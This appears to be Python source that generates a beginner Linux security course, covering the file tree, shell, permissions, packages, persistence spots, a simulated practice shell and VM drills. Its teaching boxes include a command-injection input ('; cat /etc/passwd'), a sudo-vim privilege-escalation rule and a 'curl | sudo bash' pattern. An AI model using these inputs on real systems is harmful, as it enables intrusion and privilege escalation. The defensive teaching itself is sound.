"""Stage 2 lessons: Linux theory and Linux hands-on lab. Original writing for CyberWithMadhav."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from learn_kit import *

PERMS = svg(720, 200,
  ''.join(f'<rect x="{40 + i * 64}" y="30" width="56" height="56" rx="10" class="{c}" stroke-width="1.5"/><text x="{68 + i * 64}" y="68" text-anchor="middle" font-size="24" font-weight="700">{ch}</text>'
          for i, (ch, c) in enumerate(zip("-rwxr-x---", ["s-n", "s-p", "s-p", "s-p", "s-g", "s-g", "s-g", "s-a", "s-a", "s-a"]))) +
  '<text x="68" y="112" text-anchor="middle" font-size="11" class="t-m">type</text>' +
  '<text x="168" y="112" text-anchor="middle" font-size="12" font-weight="600">owner: rwx = 7</text>' +
  '<text x="360" y="112" text-anchor="middle" font-size="12" font-weight="600">group: r-x = 5</text>' +
  '<text x="552" y="112" text-anchor="middle" font-size="12" font-weight="600">others: --- = 0</text>' +
  '<text x="360" y="150" text-anchor="middle" font-size="13">r = 4   w = 2   x = 1     so  -rwxr-x---  is  chmod 750</text>' +
  '<text x="360" y="180" text-anchor="middle" font-size="11" class="t-m">first character: - file, d directory, l symbolic link</text>',
  "Breakdown of the permission string -rwxr-x---: owner read write execute, group read execute, others nothing, which is 750")

fhs = [("/", "<p>The root of the single directory tree. There are no drive letters; other disks are <strong>mounted</strong> into folders inside this tree.</p>"),
  ("/etc", "<p>System wide <strong>configuration</strong> as plain text: users (<code>/etc/passwd</code>), password hashes (<code>/etc/shadow</code>), SSH server settings, sudo rules, scheduled jobs. Attackers read it to learn the system and write to it to persist; defenders watch it for changes.</p>"),
  ("/home", "<p>One folder per user: documents, shell history (<code>~/.bash_history</code>), SSH keys (<code>~/.ssh</code>) and startup files like <code>~/.bashrc</code>. History files often reveal passwords typed by mistake.</p>"),
  ("/root", "<p>The root user's home folder, separate from /home so it is available even if /home is on a failed disk.</p>"),
  ("/var/log", "<p>Logs. On Debian and Ubuntu <code>auth.log</code> records logins, sudo and SSH; on RHEL family systems it is <code>/var/log/secure</code>. Also <code>syslog</code> or <code>messages</code>, and web server logs. Systemd also keeps a binary journal you read with <code>journalctl</code>.</p>"),
  ("/tmp", "<p>Temporary files, writable by every user, with the <strong>sticky bit</strong> set so users cannot delete each other's files. Because anyone can write here, attackers often drop tools in /tmp or /dev/shm. Many systems clear it at reboot.</p>"),
  ("/bin, /usr/bin", "<p>Programs (binaries) for all users: ls, cat, bash, python3. On modern distributions /bin is just a link to /usr/bin. <code>/sbin</code> and <code>/usr/sbin</code> hold system admin tools.</p>"),
  ("/usr", "<p>Read only software and data installed by the package manager: programs, libraries (<code>/usr/lib</code>), documentation (<code>/usr/share</code>). Locally built software goes in <code>/usr/local</code>.</p>"),
  ("/opt", "<p>Add on software installed as a whole folder, often third party or commercial tools.</p>"),
  ("/dev", "<p>Device files: <code>/dev/sda</code> is the first disk, <code>/dev/null</code> discards anything written to it. Everything is a file, even hardware.</p>"),
  ("/proc, /sys", "<p>Not real files on disk. The kernel shows live information here: <code>/proc/&lt;PID&gt;/</code> for each process (its command line, open files, memory map), <code>/proc/cpuinfo</code>, and kernel settings under <code>/proc/sys</code>. Forensics tools read these heavily.</p>"),
  ("/boot", "<p>The kernel (<code>vmlinuz</code>), the initial RAM disk and the boot loader (GRUB) configuration.</p>"),
  ("/mnt, /media", "<p>Mount points for temporary file systems and removable media such as USB drives.</p>")]

def lesson_linux_theory():
  S = []
  S.append(dict(id="why-linux", h="Why Linux runs the world, and where it came from", hi_h="Linux kyun zaroori hai",
    body=f'''<p>If you work in security you will work on Linux. It runs the large majority of web servers and cloud instances, nearly every supercomputer, most routers, smart TVs and CCTV recorders, and the Android kernel on most phones in your college. Most security tools are written for it first.</p>
<h3>A short history that explains a lot</h3>
<ul>
<li><strong>1969</strong>: Ken Thompson and Dennis Ritchie at Bell Labs create <strong>Unix</strong>. Its ideas (small tools that do one job, plain text files, everything is a file, a multiuser permission model) still shape Linux.</li>
<li><strong>1983</strong>: Richard Stallman launches the <strong>GNU</strong> project to build a free Unix like system. By the early 1990s it had a compiler, shell and tools, but no finished kernel.</li>
<li><strong>1991</strong>: Linus Torvalds, a student in Helsinki, announces a hobby kernel on 25 August. Combined with the GNU tools it became a complete free operating system. The kernel is released under the <strong>GPL</strong> licence, so anyone can read, change and share it.</li>
</ul>
<p>Strictly, <strong>Linux is only the kernel</strong>. What you install is a <strong>distribution</strong>: the kernel plus GNU tools, a package manager, a desktop or server setup and thousands of programs.</p>
{analogy("<p>The kernel is a car engine. A distribution is the finished car: same kind of engine, but Ubuntu, Fedora and Kali each choose their own body, seats and dashboard.</p>")}''',
    hi="Linux servers, cloud, routers aur Android ke andar chalta hai, aur zyada tar security tools pehle Linux ke liye bante hain. 1969 Unix, 1983 GNU, 1991 Linus Torvalds ka kernel. Linux asal mein sirf kernel hai; Ubuntu, Fedora, Kali distributions hain."))

  S.append(dict(id="distros", h="Distributions: which one, and why", hi_h="Distributions: kaunsa aur kyun",
    body=f'''{table(["Family", "Examples", "Package tool", "Where you meet it"], [
  ["Debian", "Debian, Ubuntu, Linux Mint, Kali Linux", "<code>apt</code>, .deb files", "most tutorials, many cloud servers, security labs"],
  ["Red Hat", "RHEL, Fedora, Rocky Linux, AlmaLinux, CentOS Stream", "<code>dnf</code>, .rpm files", "banks, enterprises, government data centres"],
  ["Arch", "Arch Linux, Manjaro", "<code>pacman</code>", "enthusiasts who like to build their own system"],
  ["Alpine", "Alpine Linux", "<code>apk</code>", "tiny Docker containers"],
  ["SUSE", "openSUSE, SLES", "<code>zypper</code>", "some enterprises, SAP systems"]],
  "Linux distribution families")}
<p><strong>Ubuntu LTS</strong> (long term support) releases come every two years in April and get five years of standard security updates, which is why servers use them. <strong>Kali Linux</strong> is a Debian based toolkit for penetration testing by Offensive Security. It is excellent inside a lab VM, but it is not meant to be your everyday desktop.</p>
{defend("<p>Learn on Ubuntu (what most servers you defend will run), then add Kali as a second VM when you start the offensive labs. Knowing both apt and dnf means you can work on almost any server.</p>")}''',
    hi="Debian family (Ubuntu, Kali) apt use karti hai, Red Hat family (RHEL, Fedora, Rocky) dnf. Ubuntu LTS ko 5 saal security updates milte hain isliye servers pe common hai. Kali lab VM ke liye best hai, roz ke desktop ke liye nahi."))

  S.append(dict(id="file-hierarchy", h="The file hierarchy: everything is a file", hi_h="File hierarchy: sab kuch file hai",
    body=f'''<p>Linux has one tree starting at <code>/</code>, laid out by the Filesystem Hierarchy Standard. Learn it once and you can find your way on any distribution, which is exactly what an investigator or attacker does on an unknown server.</p>
{explorer("Explore the Linux tree", "Pick a folder to see what lives there and why security people care.", [(f"<code>{p}</code>", f"<h4><code>{p}</code></h4>{d}") for p, d in fhs])}
<p>Paths are either <strong>absolute</strong>, starting from <code>/</code> (<code>/var/log/auth.log</code>), or <strong>relative</strong> to where you are (<code>../logs</code>). <code>~</code> means your home folder, <code>.</code> the current folder, <code>..</code> the parent. Names are case sensitive: <code>Report.txt</code> and <code>report.txt</code> are different files. Names starting with a dot are hidden from a plain <code>ls</code>.</p>''',
    hi="Linux mein ek hi tree hai jo / se shuru hota hai, drive letters nahi. /etc mein config, /home mein users ka data, /var/log mein logs, /tmp sabke liye writable (attacker yahan tools rakhte hain), /proc mein live kernel info. Dot se shuru hone wali files hidden hoti hain."))

  S.append(dict(id="shell", h="The shell: talking to Linux", hi_h="Shell: Linux se baat karna",
    body=f'''<p>The <strong>terminal</strong> is the window; the <strong>shell</strong> is the program inside it that reads your commands. Most systems use <strong>bash</strong>; macOS and many power users use zsh. A command has a simple shape:</p>
{code(["$ ls -la /etc", "# command  options  argument"], "Command anatomy", copy=False)}
<ul>
<li><strong>Options</strong> change behaviour: short ones like <code>-l</code> can be combined (<code>-la</code>); long ones look like <code>--all</code>.</li>
<li>The shell finds programs by searching each folder in the <code>PATH</code> variable in order. <code>which ls</code> shows which file will run.</li>
<li>Help is built in: <code>man ls</code>, <code>ls --help</code>, and <code>tldr ls</code> if installed.</li>
</ul>
<h3>Pipes and redirection: the real superpower</h3>
<p>Every program has three standard streams: input (0, stdin), output (1, stdout) and errors (2, stderr). You can connect them:</p>
{table(["Syntax", "Meaning", "Example"], [
  ["<code>a | b</code>", "send a's output into b's input", "<code>cat auth.log | grep Failed</code>"],
  ["<code>&gt; file</code>", "write output to a file (overwrites)", "<code>ls &gt; list.txt</code>"],
  ["<code>&gt;&gt; file</code>", "append output to a file", "<code>echo done &gt;&gt; log.txt</code>"],
  ["<code>2&gt;/dev/null</code>", "throw error messages away", "<code>find / -name '*.conf' 2&gt;/dev/null</code>"],
  ["<code>a &amp;&amp; b</code>", "run b only if a succeeded", "<code>sudo apt update &amp;&amp; sudo apt upgrade</code>"],
  ["<code>*</code>, <code>?</code>", "wildcards matching file names", "<code>ls *.log</code>"]],
  "Pipes and redirection")}
<p>Chaining small tools is how analysts answer questions fast. This line counts failed SSH logins per IP address from a log:</p>
{code(["$ grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn"], "Failed logins per IP")}
{attack("<ul><li><strong>Command injection</strong>: if a web app passes user input to a shell, input like <code>; cat /etc/passwd</code> runs a second command.</li><li><strong>PATH hijacking</strong>: if a script run by root calls <code>tar</code> without a full path and an attacker controls a folder early in PATH, their fake tar runs as root.</li></ul>")}
{defend("<p>Shell history (<code>~/.bash_history</code>) is evidence; attackers often delete it or run <code>unset HISTFILE</code>, and a missing or empty history on an active account is itself a clue.</p>")}''',
    hi="Terminal window hai, shell (bash) wo program jo commands padhta hai. Command = naam + options + argument. Pipe | ek command ka output doosre ko deta hai, > file mein likhta hai, >> add karta hai. Chhote tools jodkar analyst minutes mein log analyse kar leta hai."))

  S.append(dict(id="permissions", h="Users, groups and permissions", hi_h="Users, groups aur permissions",
    body=f'''<p>Linux is multiuser from the ground up. Users are listed in <code>/etc/passwd</code> (readable by everyone, no passwords inside despite the name), password hashes live in <code>/etc/shadow</code> (readable only by root), and groups in <code>/etc/group</code>.</p>
{code(["$ grep student /etc/passwd", "student:x:1000:1000:Student,,,:/home/student:/bin/bash", "# name : x (hash is in shadow) : UID : GID : comment : home : shell"], "passwd format", copy=False)}
<p>UID 0 is <strong>root</strong>, all powerful. Normal users start at 1000 on most distributions; lower numbers are system and service accounts, usually with the shell <code>/usr/sbin/nologin</code>. Modern Ubuntu and Debian store passwords as <strong>yescrypt</strong> hashes (they start with <code>$y$</code>); older systems used SHA-512 (<code>$6$</code>).</p>
<h3>Reading and setting permissions</h3>
{fig(PERMS, "Each file has an owner and a group, and three sets of read, write and execute bits.", "Permission string breakdown")}
<p>For a <strong>directory</strong> the bits mean something slightly different: <em>r</em> lets you list names, <em>w</em> lets you create and delete files inside, and <em>x</em> lets you enter it and reach files by name.</p>
{perm_calc()}
{table(["Special bit", "Octal", "On a file", "On a directory"], [
  ["SUID", "4000", "runs with the <em>file owner's</em> privileges (often root); shown as <code>s</code> in the owner x spot", "ignored on Linux"],
  ["SGID", "2000", "runs with the file's group", "new files inherit the directory's group"],
  ["Sticky", "1000", "no effect today", "only a file's owner can delete it, as on /tmp (shown as <code>t</code>)"]],
  "Special permission bits")}
<p><code>sudo</code> lets permitted users run single commands as root, with rules in <code>/etc/sudoers</code> (always edit it with <code>visudo</code>). New files get default permissions from the <strong>umask</strong>, typically 022 for system accounts and 002 on some desktop setups, giving 644 files and 755 directories.</p>
{attack("<p>Privilege escalation on Linux often comes from: SUID programs that can be tricked into running a shell (catalogued by GTFOBins), sudo rules like <code>student ALL=(ALL) NOPASSWD: /usr/bin/vim</code> (vim can open a root shell), world writable scripts that root runs from cron, and readable backup copies of <code>/etc/shadow</code>.</p>")}
{defend("<p>Audit regularly: <code>find / -perm -4000 -type f 2&gt;/dev/null</code> lists SUID files, <code>sudo -l</code> shows a user's sudo rights, and <code>find / -perm -0002 -type f 2&gt;/dev/null</code> finds world writable files. Never <code>chmod 777</code> to fix an error; find out which user really needs access.</p>")}''',
    hi="/etc/passwd mein users, /etc/shadow mein password hashes (sirf root padh sakta hai). Permission r=4, w=2, x=1, owner, group aur others ke liye: 750 matlab owner sab kuch, group padh aur chala sakta hai, baaki kuch nahi. SUID files aur galat sudo rules se attacker root ban sakta hai. chmod 777 kabhi mat karo."))

  S.append(dict(id="packages", h="Packages: installing software safely", hi_h="Packages: software safely install karna",
    body=f'''<p>Linux installs software from <strong>repositories</strong>: online collections run by the distribution. Every package is <strong>cryptographically signed</strong>, and the package manager checks the signature before installing, which is a big security advantage over downloading random installers.</p>
{table(["Task", "Debian and Ubuntu", "RHEL, Fedora, Rocky"], [
  ["Refresh the package list", "<code>sudo apt update</code>", "<code>sudo dnf check-update</code>"],
  ["Install updates", "<code>sudo apt upgrade</code>", "<code>sudo dnf upgrade</code>"],
  ["Install a package", "<code>sudo apt install nmap</code>", "<code>sudo dnf install nmap</code>"],
  ["Remove", "<code>sudo apt remove nmap</code>", "<code>sudo dnf remove nmap</code>"],
  ["Search", "<code>apt search wireshark</code>", "<code>dnf search wireshark</code>"],
  ["What owns this file?", "<code>dpkg -S /usr/bin/ssh</code>", "<code>rpm -qf /usr/bin/ssh</code>"]],
  "Package commands")}
<p>Note that <code>apt update</code> only refreshes the list; <code>apt upgrade</code> actually installs updates. Ubuntu can install security updates automatically through <code>unattended-upgrades</code>. Snap and Flatpak are newer formats that bundle an app with its dependencies.</p>
{attack("<p>Software supply chains are a growing target. In March 2024, Microsoft engineer Andres Freund noticed SSH logins on Debian testing were half a second slower and traced it to a backdoor hidden in the <strong>xz utils</strong> compression library (CVE-2024-3094), planted by a contributor who had built trust over about two years. It was caught before reaching most stable releases. On a smaller scale, piping a script from the internet straight into a shell (<code>curl ... | sudo bash</code>) runs whatever the server sends.</p>")}
{defend("<p>Install from official repositories, keep systems patched, read scripts before running them, and verify downloads with checksums and signatures (see <a href=\"blog-verify-downloads-sha256.html\">how to verify downloads with SHA-256</a>).</p>")}''',
    hi="Linux software signed repositories se aata hai, isliye safe hai. apt update sirf list refresh karta hai, apt upgrade asli updates install karta hai. 2024 mein xz utils backdoor supply chain attack tha jo time pe pakda gaya. curl | sudo bash se pehle script padho."))

  S.append(dict(id="processes-services", h="Processes, services, scheduled jobs and logs", hi_h="Processes, services, cron aur logs",
    body=f'''{table(["Want to", "Command"], [
  ["see every process", "<code>ps aux</code> or <code>ps -ef --forest</code>"], ["watch live usage", "<code>top</code> or <code>htop</code>"],
  ["stop a process politely", "<code>kill PID</code> (sends SIGTERM, 15)"], ["force stop", "<code>kill -9 PID</code> (SIGKILL, cannot be caught)"],
  ["see network listeners and their programs", "<code>sudo ss -tulnp</code>"], ["see open files of a process", "<code>sudo lsof -p PID</code>"]],
  "Process commands")}
<p>Most distributions use <strong>systemd</strong> as PID 1. It starts and supervises <strong>services</strong> (units):</p>
{code(["$ systemctl status ssh", "$ sudo systemctl enable --now ssh", "$ systemctl list-units --type=service --state=running", "$ journalctl -u ssh --since '1 hour ago'"], "systemd")}
<p>Scheduled jobs run through <strong>cron</strong> (<code>crontab -l</code> for your own, <code>/etc/crontab</code> and <code>/etc/cron.d/</code> for the system) and systemd <strong>timers</strong> (<code>systemctl list-timers</code>).</p>
{attack("<p>Linux persistence favourites: a new cron job or systemd service, a line added to <code>~/.bashrc</code>, an attacker's public key appended to <code>~/.ssh/authorized_keys</code>, and a new user with UID 0. Crypto mining malware on hacked servers commonly uses cron to restart itself.</p>")}
{defend("<p>Check those exact places on any server you suspect: <code>crontab -l</code> for each user, <code>ls /etc/cron.*</code>, <code>systemctl list-unit-files --state=enabled</code>, <code>~/.ssh/authorized_keys</code>, and <code>awk -F: '$3==0' /etc/passwd</code> (only root should appear). Ship logs off the server so an intruder cannot quietly delete them.</p>")}
{terminal(dict(id="theory", missions=[
  dict(t="Where are you? Print your current directory.", hint="<code>pwd</code>", c=dict(type="cmd", re=r"^pwd$")),
  dict(t="List the top of the tree: <code>/</code>", hint="<code>ls /</code>", c=dict(type="cmd", re=r"^ls\s+(-\w+\s+)*/$")),
  dict(t="Which distribution is this? Read <code>/etc/os-release</code>.", hint="<code>cat /etc/os-release</code>", c=dict(type="cmd", re=r"^cat\s+/etc/os-release$")),
  dict(t="Look at the permissions of <code>/etc/shadow</code> with a long listing.", hint="<code>ls -l /etc/shadow</code>", c=dict(type="cmd", re=r"^ls\s+-\w*l\w*\s+/etc/shadow$")),
  dict(t="Try to read <code>/etc/shadow</code> as student, then again with <code>sudo</code>.", hint="<code>cat /etc/shadow</code> fails, then <code>sudo cat /etc/shadow</code>", c=dict(type="cmd", re=r"^sudo\s+cat\s+/etc/shadow$")),
  dict(t="Find every account with UID 0. Only root should appear.", hint="UID is the third field. Search for it directly: <code>grep ':x:0:' /etc/passwd</code>", c=dict(type="output", v="root:x:0:0:root:/root:/bin/bash"))],
  intro=["Practice shell: Ubuntu 24.04 style, user student. Try the missions on the right, or explore freely."]), "Linux theory sandbox")}''',
    hi="ps aux se processes, kill se band karo (kill -9 zabardasti). systemd services chalata hai: systemctl status, journalctl se logs. cron scheduled jobs chalata hai. Attacker cron, systemd service, .bashrc aur authorized_keys mein persistence banata hai, to defender wahi jagah check karta hai."))

  return dict(
    slug="learn-linux-fundamentals", stage=2, n="2.1", minutes=60, level="Beginner",
    title="Linux Fundamentals: Theory", short="History, distros, the file tree, shell, permissions, packages, processes and logs.",
    seo_title="Linux Fundamentals for Cybersecurity: File System, Permissions, Shell | CyberWithMadhav",
    desc="Free Linux theory lesson for security: distros, the file hierarchy, bash pipes and redirection, users, chmod and SUID, packages, systemd, cron and logs, with a browser sandbox.",
    kw="linux fundamentals for cybersecurity, linux file system hierarchy, chmod permissions calculator, suid sgid sticky bit, bash pipes redirection, systemd journalctl, linux for beginners india",
    kicker="$ lesson 2.1 --stage linux", hi_title="Linux fundamentals: theory",
    lead="Theory first, then the terminal. Understand how Linux is organised, how permissions really work and where it keeps its evidence, and every command you learn afterwards will make sense instead of being memorised.",
    hi_lead="Pehle theory, phir terminal. Samjho Linux kaise organised hai, permissions kaise kaam karti hain aur saboot kahan rakhta hai. Phir har command samajh mein aayegi, ratna nahi padega.",
    goals=["Explain what Linux, GNU and a distribution are and pick a distro for a job", "Navigate the file hierarchy and know what lives in /etc, /var/log, /tmp and /proc", "Use pipes, redirection and chaining to answer questions from logs", "Read and set permissions in symbolic and octal form, and explain SUID, SGID and sticky", "Manage packages, processes and services, and know Linux persistence spots"],
    sections=S,
    cards=[("Is Linux an operating system?", "Strictly, Linux is the kernel. A distribution adds tools, a package manager and software to make a full OS."),
      ("Where are password hashes stored?", "/etc/shadow, readable only by root."),
      ("chmod 640 means?", "Owner read and write, group read, others nothing: -rw-r-----."),
      ("What does the sticky bit do on /tmp?", "Only a file's owner (or root) can delete or rename it, even though everyone can write in the folder."),
      ("apt update vs apt upgrade?", "update refreshes the package list; upgrade installs newer versions."),
      ("SIGTERM vs SIGKILL?", "SIGTERM (15) asks a process to exit and can be handled. SIGKILL (9) ends it immediately."),
      ("Where are SSH logins logged on Ubuntu?", "/var/log/auth.log, and in the journal: journalctl -u ssh."),
      ("Find SUID files?", "find / -perm -4000 -type f 2>/dev/null")],
    quiz=[("Which file can every user read but contains no password hashes?", ["/etc/shadow", "/etc/passwd", "/etc/sudoers", "/root/.bashrc"], 1, "/etc/passwd is world readable; hashes moved to /etc/shadow long ago."),
      ("A script shows <code>-rwxr-x--x</code>. What octal mode is that?", ["751", "755", "715", "640"], 0, "rwx = 7, r-x = 5, --x = 1."),
      ("Why is <code>/tmp</code> interesting during an investigation?", ["It holds the kernel", "Any user can write there, so attackers often drop tools in it", "It stores password hashes", "It is read only"], 1, "World writable locations like /tmp and /dev/shm are common drop points."),
      ("What does <code>2&gt;/dev/null</code> do?", ["Deletes the file", "Sends error messages to nowhere", "Runs the command twice", "Logs out"], 1, "Stream 2 is stderr; /dev/null discards it."),
      ("A user's sudo rule allows <code>NOPASSWD: /usr/bin/vim</code>. Why is that dangerous?", ["vim is slow", "vim can launch a shell, which would run as root", "vim deletes logs", "It is not dangerous"], 1, "Many editors and tools can spawn a shell; GTFOBins lists them."),
      ("Which is a common Linux persistence location?", ["~/.ssh/authorized_keys", "/proc/cpuinfo", "/dev/null", "/usr/share/doc"], 0, "Adding a public key there gives the attacker passwordless SSH access.")],
    lab=dict(title="Lab: theory into muscle memory", time="30 minutes",
      needs="Your Ubuntu VM. The full hands-on lab is lesson 2.2; this one checks the theory.",
      steps=[("Walk the tree", code(["$ cd / && ls", "$ ls -la /etc | head -20", "$ ls /var/log", "$ cat /proc/version"], "Walk") + "<p>For each top level folder, say in one line what it holds without looking at this page.</p>"),
        ("Read the account files", code(["$ cat /etc/passwd", "$ awk -F: '$3==0' /etc/passwd", "$ sudo head -3 /etc/shadow", "$ getent group sudo"], "Accounts") + "<p>Count accounts with a real login shell versus <code>nologin</code>. Check that only root has UID 0. Note the <code>$y$</code> hash prefix.</p>"),
        ("Audit permissions", code(["$ find / -perm -4000 -type f 2>/dev/null", "$ sudo -l", "$ ls -ld /tmp"], "Audit") + "<p>Write down the SUID programs you find (passwd, sudo, su and mount are normal) and the <code>t</code> at the end of /tmp's permissions.</p>"),
        ("Check persistence spots on your own VM", code(["$ crontab -l", "$ ls /etc/cron.d /etc/cron.daily", "$ systemctl list-unit-files --state=enabled | head -30", "$ ls -la ~/.ssh 2>/dev/null"], "Persistence") + "<p>This is the baseline of a clean machine. Save the output to a file; comparing against a baseline is how you spot changes later.</p>")],
      verify="You can explain the purpose of each top level folder, read a passwd line, convert a permission string to octal, and list where Linux persistence hides."),
    takeaways=["Linux is a kernel; distributions turn it into a usable system.",
      "/etc for config, /var/log for evidence, /tmp for things that should not be there.",
      "Pipes turn small tools into an analysis engine.",
      "rwx for owner, group and others; SUID and bad sudo rules are the classic escalation paths.",
      "cron, systemd, .bashrc and authorized_keys are where intruders persist."])


def lesson_linux_lab():
  S = []
  S.append(dict(id="build-lab", h="Build your Linux lab the right way", hi_h="Apna Linux lab sahi tarike se banao",
    body=f'''<p>A lab is a set of machines that belong to you, isolated from anything you do not own, that you can break and restore at will. A laptop with 8 GB of RAM is enough to start.</p>
{table(["Setting", "Recommended", "Why"], [
  ["Hypervisor", "VirtualBox (free) or VMware Workstation Pro (now free for personal use)", "runs VMs on Windows, Linux or Intel Macs; Apple Silicon Macs use UTM with ARM images"],
  ["Guest OS", "Ubuntu Server or Desktop 24.04 LTS", "what real servers run; Desktop is friendlier at first"],
  ["CPU and RAM", "2 vCPU, 2 to 4 GB RAM", "leave at least half your RAM for the host"],
  ["Disk", "25 GB, dynamically allocated", "only uses space as it fills"],
  ["Adapter 1", "NAT", "internet access for updates, hidden from your home network"],
  ["Adapter 2", "Host-only", "lets your own PC SSH into the VM on a private network"]],
  "Lab VM settings")}
{table(["Network mode", "VM can reach internet", "Other devices on your Wi-Fi can reach VM", "Use it for"], [
  ["NAT", "yes", "no", "default, safe, updates"], ["Host-only", "no", "no, only your PC", "SSH and lab traffic between your own machines"],
  ["Internal network", "no", "no, only other VMs", "isolated attacker and victim VMs"], ["Bridged", "yes", "yes, VM is like a new device on your network", "avoid for vulnerable or attack VMs"]],
  "VirtualBox network modes")}
<p><strong>Snapshots</strong> are your undo button. Take one after installation and before every risky exercise.</p>
<div class="lx-legal" role="note"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3 2 21h20L12 3z"/><path d="M12 10v5M12 18h.01"/></svg><p><strong>Only on machines you own.</strong> Everything in this lab runs inside your own VMs on your own computer. Scanning, logging into or testing any system you do not own, or do not have written permission to test, can be an offence under the Information Technology Act, 2000 (for example Sections 43 and 66). College and office networks are not your lab unless the owner has given you permission in writing.</p></div>
<p>More detail on safe setups is in <a href="blog-safe-home-lab-setup.html">how to set up a safe home lab</a>.</p>''',
    hi="Lab matlab aapki apni machines jo baaki duniya se alag hon. VirtualBox mein Ubuntu 24.04 VM: 2 CPU, 4 GB RAM, 25 GB disk. Adapter 1 NAT (internet ke liye), Adapter 2 Host-only (apne PC se SSH ke liye). Bridged mode vulnerable VMs ke liye avoid karo. Har risky kaam se pehle snapshot lo. Sirf apni machines pe practice karo."))

  S.append(dict(id="browser-shell", h="Warm up: nine missions in a safe browser shell", hi_h="Warm up: browser shell mein 9 missions",
    body=f'''<p>Before touching your VM, practise in this simulated shell. It behaves like Ubuntu for the common commands, and it contains a real looking <code>/var/log/auth.log</code> with an SSH brute force attack in it. Your missions are on the right. Press <kbd>Tab</kbd> to complete names and <kbd>Up</kbd> for history.</p>
{terminal(dict(id="lab", missions=[
  dict(t="Print where you are.", hint="<code>pwd</code>", c=dict(type="cmd", re=r"^pwd$"), ok="You are in your home folder."),
  dict(t="List <em>all</em> files in your home folder, including hidden ones, in long format.", hint="<code>ls -la</code>", c=dict(type="cmd", re=r"^ls\s+-(?=\w*a)(?=\w*l)\w+(\s+(\.|~|/home/student)/?)?$")),
  dict(t="Read the hidden mission file you just found.", hint="<code>cat .mission</code>", c=dict(type="cmd", re=r"^(cat|less|more)\s+(~/|\./|/home/student/)?\.mission$")),
  dict(t="Create a folder called <code>lab</code> in your home, and an empty file <code>report.txt</code> inside it.", hint="<code>mkdir lab</code> then <code>touch lab/report.txt</code>", c=dict(type="exists", path="/home/student/lab/report.txt", kind="f")),
  dict(t="Write the line <code>case 001: ssh brute force</code> into <code>lab/report.txt</code>, then read it back.", hint="<code>echo \"case 001: ssh brute force\" &gt; lab/report.txt</code>", c=dict(type="contains", path="/home/student/lab/report.txt", text="case 001")),
  dict(t="The script <code>tools/scan.sh</code> is not executable. Give the owner execute permission, then run it.", hint="<code>chmod u+x tools/scan.sh</code> then <code>./tools/scan.sh</code>", c=dict(type="mode", path="/home/student/tools/scan.sh", bit=64), ok="Run ./tools/scan.sh to see what it does."),
  dict(t="How many failed SSH password attempts are in <code>/var/log/auth.log</code>? Make the shell print just the number.", hint="<code>grep \"Failed password\" /var/log/auth.log | wc -l</code> or <code>grep -c</code>", c=dict(type="output", v="9")),
  dict(t="Which IP address failed the most? Count failures per IP, then type <code>answer &lt;ip&gt;</code>.", hint="<code>grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn</code>", c=dict(type="answer", v="203.0.113.45"), ok="203.0.113.45 tried root, admin, test and oracle: a classic brute force."),
  dict(t="A file in <code>downloads</code> is not what its name says. Inspect it with <code>file</code> and <code>cat</code>, then delete it.", hint="<code>file downloads/invoice_2026.pdf.sh</code>, <code>cat</code> it, then <code>rm downloads/invoice_2026.pdf.sh</code>", c=dict(type="gone", path="/home/student/downloads/invoice_2026.pdf.sh"), ok="It piped a download into bash: a typical Linux malware dropper.")],
  intro=["CyberWithMadhav practice shell. Simulated Ubuntu 24.04, user student, host cwm-lab.", "Everything here runs in your browser. It cannot touch your computer or any network."]), "Linux lab shell")}
<p class="small muted">Stuck? Each mission has a hint button. Reset restores the starting files.</p>''',
    hi="Pehle browser shell mein practice karo. Isme ek nakli auth.log hai jisme SSH brute force attack hai. 9 missions: pwd, hidden files, folder banana, file mein likhna, chmod, failed logins ginna, sabse zyada attack karne wala IP dhoondhna, aur ek malware dropper file delete karna."))

  drills = [
    ("Navigation and files", ["$ cd ~ && mkdir -p practice/{logs,scripts,notes}", "$ cd practice && tree . || ls -R", "$ cp /etc/hosts notes/ && mv notes/hosts notes/hosts.bak", "$ rm -r notes && ls"], "Use <code>sudo apt install tree</code> if tree is missing. Brace expansion <code>{a,b}</code> made three folders at once."),
    ("Find things", ["$ find /etc -name '*.conf' 2>/dev/null | head", "$ find ~ -type f -mmin -60", "$ grep -rn 'PermitRootLogin' /etc/ssh/ 2>/dev/null", "$ which python3 && file $(which python3)"], "<code>-mmin -60</code> means changed in the last 60 minutes: a quick way to see what an intruder just touched."),
    ("Text processing", ["$ sudo grep -c 'session opened' /var/log/auth.log", "$ cut -d: -f1,7 /etc/passwd | head", "$ sudo tail -f /var/log/auth.log", "# press Ctrl+C to stop following"], "Keep <code>tail -f</code> running in one terminal while you log in over SSH from another, and watch the lines appear live."),
    ("Permissions", ["$ echo 'echo hello from script' > hello.sh", "$ ./hello.sh", "$ chmod 750 hello.sh && ls -l hello.sh && ./hello.sh", "$ sudo chown root:root hello.sh && ls -l hello.sh"], "The first run fails with Permission denied. After chmod it works. After chown to root, try <code>echo x &gt;&gt; hello.sh</code> and see it refused."),
    ("Users and sudo", ["$ sudo adduser intern", "$ id intern && sudo -l -U intern", "$ su - intern", "$ sudo whoami", "$ exit"], "As intern, <code>sudo</code> is refused because intern is not in the sudo group. Remove the account afterwards with <code>sudo deluser --remove-home intern</code>."),
    ("Packages and updates", ["$ sudo apt update && apt list --upgradable", "$ sudo apt upgrade -y", "$ sudo apt install -y htop net-tools", "$ apt show openssh-server | head"], "Check whether <code>unattended-upgrades</code> is installed: <code>systemctl status unattended-upgrades</code>."),
    ("Processes and services", ["$ ps aux --sort=-%mem | head", "$ sleep 600 & ", "$ jobs && pgrep -a sleep", "$ kill %1", "$ systemctl list-units --type=service --state=running"], "Background a job with <code>&amp;</code>, find it, and stop it."),
    ("Networking from the shell", ["$ ip -br a && ip route", "$ sudo ss -tulnp", "$ curl -sI https://www.cyberwithmadhav.com | head -5", "$ dig +short cyberwithmadhav.com"], "Match every listening port in <code>ss</code> to a program.")]
  S.append(dict(id="vm-drills", h="On your VM: eight drills that cover daily work", hi_h="VM pe 8 drills",
    body='<p>Now repeat it for real. Open a terminal in your Ubuntu VM and work through each drill. Read what each command prints before moving on; that is where the learning happens.</p>' +
      "".join(f'<h3>{i + 1}. {t}</h3>{code(c, t)}<p>{n}</p>' for i, (t, c, n) in enumerate(drills)),
